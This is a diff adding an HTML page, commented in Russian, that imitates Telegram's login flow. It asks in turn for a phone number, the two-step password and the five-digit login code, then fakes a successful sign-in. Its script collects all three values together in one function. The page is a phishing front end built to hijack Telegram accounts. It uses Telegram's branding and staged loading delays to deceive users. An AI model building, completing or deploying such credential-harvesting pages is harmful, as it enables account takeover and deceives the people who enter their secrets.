@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login (Phone -> Password -> Code)</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .logo { width: 170px; height: 170px; margin-bottom: 20px; }
+
+        h2 {
+            font-size: 24px; margin-bottom: 10px; font-weight: 700;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+
+        .edit-icon {
+            color: #3390ec; cursor: pointer; font-size: 20px; transition: transform 0.2s;
+        }
+        .edit-icon:hover { transform: scale(1.1); }
+
+        p { color: #707579; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
+
+        /* === ПОЛЯ ВВОДА (ОБЩИЙ СТИЛЬ) === */
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 18px;
+            border: 2px solid #dfe1e5;
+            border-radius: 14px; /* Закругление как просили */
+            outline: none;
+            background: transparent;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        /* Для пароля нужен отступ справа, чтобы текст не наехал на глаз */
+        #password { padding-right: 45px; }
+
+        .input-field:focus {
+            border-color: #3390ec;
+        }
+
+        /* === ПЛАВАЮЩИЙ ЛЕЙБЛ === */
+        .input-label {
+            position: absolute;
+            left: 20px;
+            top: 17px;
+            color: #999;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background-color: #ffffff;
+            padding: 0 5px;
+        }
+
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: -10px;
+            left: 15px;
+            font-size: 12px;
+            color: #3390ec;
+            font-weight: 500;
+        }
+
+        /* === ГЛАЗИК ПАРОЛЯ === */
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+            display: flex;
+            align-items: center;
+        }
+        .password-toggle:hover { color: #3390ec; }
+        .password-toggle svg { width: 24px; height: 24px; fill: currentColor; }
+
+        /* === КНОПКИ === */
+        .btn-next {
+            background-color: #3390ec; color: white; border: none; padding: 15px;
+            width: 100%; border-radius: 12px; font-size: 16px; cursor: pointer;
+            text-transform: uppercase; font-weight: 600;
+            margin-top: 25px;
+            display: flex; justify-content: center; align-items: center; min-height: 50px;
+        }
+        .btn-next.loading { pointer-events: none; opacity: 0.8; }
+
+        .terms-link, .forgot-link {
+            display: block;
+            margin-top: 20px;
+            color: #999999;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-link { color: #3390ec; } /* Ссылка "Забыл пароль" обычно синяя */
+        .terms-link:hover, .forgot-link:hover { text-decoration: underline; }
+
+        .hidden { display: none; }
+
+        /* ЛОАДЕР */
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%;
+            border-top: 3px solid #ffffff; width: 22px; height: 22px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* КОД */
+        .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
+
+        .digit-box {
+            width: 45px; height: 55px; border: 2px solid #dfe1e5;
+            border-radius: 8px; position: relative; overflow: hidden;
+            transition: all 0.3s ease; background: transparent;
+        }
+        .digit-box:focus-within { border-color: #3390ec; box-shadow: 0 0 0 3px rgba(51, 144, 236, 0.1); }
+
+        .code-digit {
+            width: 100%; height: 100%; border: none; background: transparent;
+            font-size: 24px; font-weight: bold; text-align: center;
+            outline: none; padding: 0; margin: 0; color: black;
+        }
+
+        @keyframes slideNum {
+            0% { transform: translateY(100%); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+        .code-digit.animate-text { animation: slideNum 0.25s ease-out forwards; }
+
+        .digit-box.locked { background-color: #f3f3f3; border-color: #c4c4c4; }
+        .digit-box.locked .code-digit { color: #555; }
+        .digit-box.success { border-color: #28a745 !important; background-color: #fff !important; }
+
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo" class="logo">
+    <h2 id="main-title">Telegram</h2>
+    <p id="main-desc">Please confirm your country code and<br>enter your phone number.</p>
+
+    <form>
+        <!-- ШАГ 1: ТЕЛЕФОН -->
+        <div id="step-phone">
+            <div class="input-group">
+                <input type="tel" id="phone" class="input-field" placeholder=" ">
+                <label for="phone" class="input-label">Your phone number</label>
+            </div>
+            <button type="button" class="btn-next" id="btn-phone">Next</button>
+            <a href="#" class="terms-link">Terms of Service</a>
+        </div>
+
+        <!-- ШАГ 2: ПАРОЛЬ -->
+        <div id="step-pass" class="hidden">
+            <div class="input-group">
+                <input type="password" id="password" class="input-field" placeholder=" ">
+                <label for="password" class="input-label">Password</label>
+
+                <!-- Глазик -->
+                <div class="password-toggle" id="togglePass">
+                    <svg id="eye-closed" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    <svg id="eye-open" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 3.31 0 6.28-1.38 8.22-3.67l.48.48 2.27 2.27 1.41-1.41L3.41 2.86 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                </div>
+            </div>
+
+            <button type="button" class="btn-next" id="btn-pass">Next</button>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+
+        <!-- ШАГ 3: КОД -->
+        <div id="step-code" class="hidden">
+            <div class="code-container" id="otp-inputs">
+                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
+                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
+                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
+                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
+                <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
+            </div>
+        </div>
+    </form>
+</div>
+
+<script>
+    // ЭЛЕМЕНТЫ
+    const phoneInput = document.getElementById('phone');
+    const btnPhone = document.getElementById('btn-phone');
+    const stepPhoneDiv = document.getElementById('step-phone');
+
+    const passwordInput = document.getElementById('password');
+    const btnPass = document.getElementById('btn-pass');
+    const stepPassDiv = document.getElementById('step-pass');
+    const togglePass = document.getElementById('togglePass');
+    const eyeClosed = document.getElementById('eye-closed');
+    const eyeOpen = document.getElementById('eye-open');
+
+    const stepCodeDiv = document.getElementById('step-code');
+
+    const title = document.getElementById('main-title');
+    const desc = document.getElementById('main-desc');
+
+    // ============================================
+    // ШАГ 1: ТЕЛЕФОН
+    // ============================================
+
+    // Маска и защита плюса
+    function fixCursorPosition() {
+        if (phoneInput.value.length < 1) phoneInput.value = '+';
+        if (phoneInput.selectionStart === 0) phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
+    }
+    phoneInput.addEventListener('focus', fixCursorPosition);
+    phoneInput.addEventListener('click', fixCursorPosition);
+    phoneInput.addEventListener('blur', () => { if (phoneInput.value === '+') phoneInput.value = ''; });
+    phoneInput.addEventListener('keyup', () => { if (phoneInput.selectionStart === 0 && phoneInput.value.length > 0) phoneInput.setSelectionRange(1, 1); });
+    phoneInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && phoneInput.value.length <= 1) e.preventDefault();
+        if (e.key === 'Backspace' && phoneInput.selectionStart === 1 && phoneInput.selectionEnd === 1) e.preventDefault();
+    });
+
+    phoneInput.addEventListener('input', function (e) {
+        let x = e.target.value.replace(/\D/g, '');
+        let res = '';
+        if (x.length > 0 && (x[0] === '7' || x[0] === '8')) {
+             if (x[0] === '8') x = '7' + x.substring(1);
+             x = x.substring(0, 11);
+             res = '+7';
+             if (x.length > 1) res += ' ' + x.substring(1, 4);
+             if (x.length > 4) res += ' ' + x.substring(4, 7);
+             if (x.length > 7) res += ' ' + x.substring(7, 9);
+             if (x.length > 9) res += ' ' + x.substring(9, 11);
+        } else if (x.startsWith('380')) {
+             x = x.substring(0, 12);
+             res = '+380';
+             if (x.length > 3) res += ' ' + x.substring(3, 5);
+             if (x.length > 5) res += ' ' + x.substring(5, 8);
+             if (x.length > 8) res += ' ' + x.substring(8, 10);
+             if (x.length > 10) res += ' ' + x.substring(10, 12);
+        } else if (x.startsWith('375')) {
+             x = x.substring(0, 12);
+             res = '+375';
+             if (x.length > 3) res += ' ' + x.substring(3, 5);
+             if (x.length > 5) res += ' ' + x.substring(5, 8);
+             if (x.length > 8) res += ' ' + x.substring(8, 10);
+             if (x.length > 10) res += ' ' + x.substring(10, 12);
+        } else {
+             res = '+' + x;
+        }
+        if (res === '') res = '+';
+        e.target.value = res;
+    });
+
+    // ПЕРЕХОД: Телефон -> Пароль
+    btnPhone.addEventListener('click', function() {
+        const phoneNumber = phoneInput.value;
+        if (phoneNumber.length < 8) { alert('Неверный номер'); return; }
+
+        const originalText = btnPhone.innerText;
+        btnPhone.classList.add('loading');
+        btnPhone.innerHTML = '<div class="loader"></div>';
+
+        setTimeout(() => {
+            btnPhone.classList.remove('loading');
+            btnPhone.innerText = originalText;
+            showPasswordStep(phoneNumber);
+        }, 4000);
+    });
+
+    // ============================================
+    // ШАГ 2: ПАРОЛЬ
+    // ============================================
+
+    function showPasswordStep(phoneNumber) {
+        stepPhoneDiv.classList.add('hidden');
+        stepPassDiv.classList.remove('hidden');
+
+        // Меняем заголовок
+        title.innerText = 'Enter a Password';
+        desc.innerHTML = 'Your account is protected with<br>an additional password.';
+
+        setTimeout(() => passwordInput.focus(), 100);
+    }
+
+    // Показать/Скрыть пароль
+    togglePass.addEventListener('click', () => {
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            eyeClosed.style.display = 'none';
+            eyeOpen.style.display = 'block';
+        } else {
+            passwordInput.type = 'password';
+            eyeClosed.style.display = 'block';
+            eyeOpen.style.display = 'none';
+        }
+    });
+
+    // ПЕРЕХОД: Пароль -> Код
+    btnPass.addEventListener('click', function() {
+        if (passwordInput.value.length === 0) { alert('Enter password'); return; }
+
+        const originalText = btnPass.innerText;
+        btnPass.classList.add('loading');
+        btnPass.innerHTML = '<div class="loader"></div>';
+
+        setTimeout(() => {
+            btnPass.classList.remove('loading');
+            btnPass.innerText = originalText;
+            showCodeStep(phoneInput.value); // Передаем номер для заголовка
+        }, 4000);
+    });
+
+    // ============================================
+    // ШАГ 3: КОД
+    // ============================================
+
+    function showCodeStep(phoneNumber) {
+        stepPassDiv.classList.add('hidden');
+        stepCodeDiv.classList.remove('hidden');
+        title.innerHTML = `${phoneNumber} <span class="edit-icon" onclick="goBack()">✎</span>`;
+        desc.innerHTML = 'We have sent you a code<br>to the Telegram app.';
+        setTimeout(() => { document.querySelector('.code-digit').focus(); }, 100);
+    }
+
+    // Возврат (Сбрасывает все на начало)
+    window.goBack = function() {
+        stepCodeDiv.classList.add('hidden');
+        stepPassDiv.classList.add('hidden');
+        stepPhoneDiv.classList.remove('hidden');
+
+        title.innerText = 'Telegram';
+        desc.innerHTML = 'Please confirm your country code and<br>enter your phone number.';
+        phoneInput.focus();
+
+        // Сброс
+        passwordInput.value = '';
+        const boxes = document.querySelectorAll('.digit-box');
+        const inputs = document.querySelectorAll('.code-digit');
+        boxes.forEach(box => {
+            box.classList.remove('success');
+            box.classList.remove('locked');
+        });
+        inputs.forEach(inp => {
+            inp.value = '';
+            inp.readOnly = false;
+        });
+    };
+
+    function finishInput() {
+        const boxes = document.querySelectorAll('.digit-box');
+        const inputs = document.querySelectorAll('.code-digit');
+
+        const phoneNumber = phoneInput.value;
+        const password = passwordInput.value;
+        let code = '';
+        inputs.forEach(i => code += i.value);
+
+        console.log(`Телефон: ${phoneNumber}`);
+        console.log(`Пароль: ${password}`);
+        console.log(`Код: ${code}`);
+
+        inputs.forEach(inp => { inp.readOnly = true; inp.blur(); });
+        boxes.forEach(box => { box.classList.add('locked'); });
+
+        setTimeout(() => {
+            boxes.forEach(box => {
+                box.classList.remove('locked');
+                box.classList.add('success');
+            });
+        }, 5000);
+    }
+
+    // Логика цифр
+    const inputs = document.querySelectorAll('.code-digit');
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            if (e.target.value.length === 1) {
+                input.classList.remove('animate-text');
+                void input.offsetWidth;
+                input.classList.add('animate-text');
+                if (index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                } else {
+                    let fullCode = '';
+                    inputs.forEach(i => fullCode += i.value);
+                    if (fullCode.length === 5) finishInput();
+                }
+            }
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && index > 0) inputs[index - 1].focus();
+        });
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = e.clipboardData.getData('text').replace(/\D/g, '');
+            let idx = 0;
+            inputs.forEach(inp => {
+                if (idx < pasteData.length) {
+                    inp.value = pasteData[idx++];
+                    inp.classList.add('animate-text');
+                }
+            });
+            let fullCode = '';
+            inputs.forEach(i => fullCode += i.value);
+            if (fullCode.length === 5) finishInput();
+            else if (idx > 0) inputs[Math.min(idx, inputs.length) - 1].focus();
+        });
+    });
+</script>
+
+</body>
+</html>
